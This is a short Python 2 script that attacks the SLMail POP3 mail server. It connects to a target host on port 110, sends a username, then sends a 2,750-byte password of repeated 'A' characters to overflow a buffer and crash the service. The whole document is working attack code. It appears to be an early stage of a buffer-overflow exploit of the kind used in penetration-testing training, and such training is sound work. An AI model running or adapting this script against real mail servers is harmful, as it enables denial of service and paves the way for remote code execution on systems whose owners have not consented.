#!/usr/bin/python
import os
import socket

try:
   rhost=os.environ['RHOST']
except KeyError:
   print("Please set RHOST environment variable")
   sys.exit(0)

# Ethernet socket, open as a stream
# Attack SLMail v
buffSize=1024

try:
    pwd = 'A'*2750
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # Establish connection with POP3 (TCP:110)
    print 'Connecting to '+rhost+'...'
    conn=s.connect((rhost,110))
    data = s.recv(buffSize)
    print data
    print 'Connected. Sending user name...'
    userName='test'
    s.send('USER '+ userName +'\r\n')
    data = s.recv(buffSize)
    print data
    print 'Password: '+ pwd
    s.send('PASS '+ pwd +'\r\n')
    s.send('QUIT\r\n')
except Exception as ex:
    print str(ex)
    pass
finally:
   s.close()

